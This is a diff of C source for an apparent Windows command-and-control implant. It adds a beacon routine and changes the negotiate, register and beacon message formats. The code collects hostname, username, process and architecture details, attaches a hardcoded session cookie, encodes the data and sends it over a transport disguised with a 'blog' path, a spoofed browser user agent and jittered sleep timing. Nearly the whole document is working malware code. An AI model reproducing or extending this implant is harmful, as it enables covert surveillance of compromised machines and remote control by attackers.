@@ -18,7 +18,7 @@ struct {
 } auth;
 
 struct {
-    CHAR* status;
+    INT status;
     CHAR* format;
     CHAR* buffer;
     CHAR length[MAX_PATH];
@@ -70,6 +70,38 @@ void package(CHAR* buffer) {
     }
 }
 
+void agent_beacon() {
+    /**
+     * Beacon data structure:
+     * 
+     *      Status      4       (INT)
+     *          0: Negotiate
+     *          1: Register
+     *          2: Beacon
+     *          3: Output
+     *      Key         16      (CHAR*)
+    */
+
+    data.status = 2;
+    data.format = "%d:%s";
+
+    DWORD pointer_length = strlen(data.format) + 4 + strlen(auth.cookie);
+    CHAR* data_pointer = malloc(pointer_length);
+    sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.cookie);
+
+    DWORD data_length = pointer_length - strlen(data.format) - 2;
+    CHAR* buffer = encode(data_pointer, data_length);
+    package(buffer);
+
+    log_info("Buffer: %s", buffer); 
+
+    goto clean_memory;
+    clean_memory:
+        log_debug("Attempting to clean memory");
+        free(data_pointer);
+        free(buffer);
+}
+
 void register_device() {
     /**
      * Registration data structure:
@@ -79,11 +111,12 @@ void register_device() {
      *          1: Register
      *          2: Beacon
      *          3: Output
-     *      Hostname        256     (CHAR*)
-     *      Username        256     (CHAR*)
+     *      Key             256     (CHAR*)
+     *      Hostname        256     (CHAR)
+     *      Username        256     (CHAR)
      *      Process name    256     (CHAR*)
      *      Process id      4       (DWORD)
-     *      Arch            256     (CHAR*)
+     *      Arch            256     (CHAR)
      * 
     */
 
@@ -94,8 +127,8 @@ void register_device() {
     process_info.dwSize = sizeof(PROCESSENTRY32);
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-    data.status = "register";
-    data.format = "%s:%s,%s,%lu,%s,%s";
+    data.status = 1;
+    data.format = "%d:%s,%s,%s,%lu,%s,%s";
 
     if (GetComputerNameA(info.hostname, &default_length)) {
         log_info("Hostname %s", info.hostname);
@@ -137,11 +170,11 @@ void register_device() {
         log_error("Error: %lu\n", dw_error);
     }
 
-    DWORD pointer_length = strlen(data.format) + strlen(data.status) + strlen(info.hostname) + strlen(info.username) + 4 + strlen(info.name) + strlen(info.arch);
+    DWORD pointer_length = strlen(data.format) + 4 + strlen(auth.cookie) + strlen(info.hostname) + strlen(info.username) + 4 + strlen(info.name) + strlen(info.arch);
     CHAR* data_pointer = malloc(pointer_length);
-    sprintf_s(data_pointer, pointer_length, data.format, data.status, info.hostname, info.username, info.pid, info.name, info.arch);
+    sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.cookie, info.hostname, info.username, info.pid, info.name, info.arch);
 
-    DWORD data_length = pointer_length - strlen(data.format) + 6;
+    DWORD data_length = pointer_length - strlen(data.format) + 4;
     CHAR* buffer = encode(data_pointer, data_length);
     package(buffer);
 
@@ -168,14 +201,14 @@ void negotiate_key(CHAR* keyword) {
      * 
     */
 
-    data.status = "negotiate";
-    data.format = "%s:%s";
+    data.status = 0;
+    data.format = "%d:%s";
 
-    DWORD pointer_length = strlen(data.format) + strlen(data.status) + strlen(auth.keyword);
+    DWORD pointer_length = strlen(data.format) + 4 + strlen(auth.keyword);
     CHAR* data_pointer = malloc(pointer_length);
     sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.keyword);
 
-    DWORD data_length = pointer_length - strlen(data.format);
+    DWORD data_length = pointer_length - strlen(data.format) - 2;
     CHAR* buffer = encode(data_pointer, data_length);
     package(buffer);
 
@@ -213,7 +246,7 @@ int main(int argc, char* argv[]) {
     transport.path = "blog";
     transport.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
 
-    auth.cookie = NULL;
+    auth.cookie = "beanpocolypse";
     auth.keyword = "schistosomiasis";
 
     log_info("Path: %s", transport.path);
@@ -224,6 +257,6 @@ int main(int argc, char* argv[]) {
     Sleep(calculate_jitter(3, 30));
     register_device();
     Sleep(calculate_jitter(3, 30));
-    register_device();
+    agent_beacon();
     Sleep(calculate_jitter(3, 30));
 }
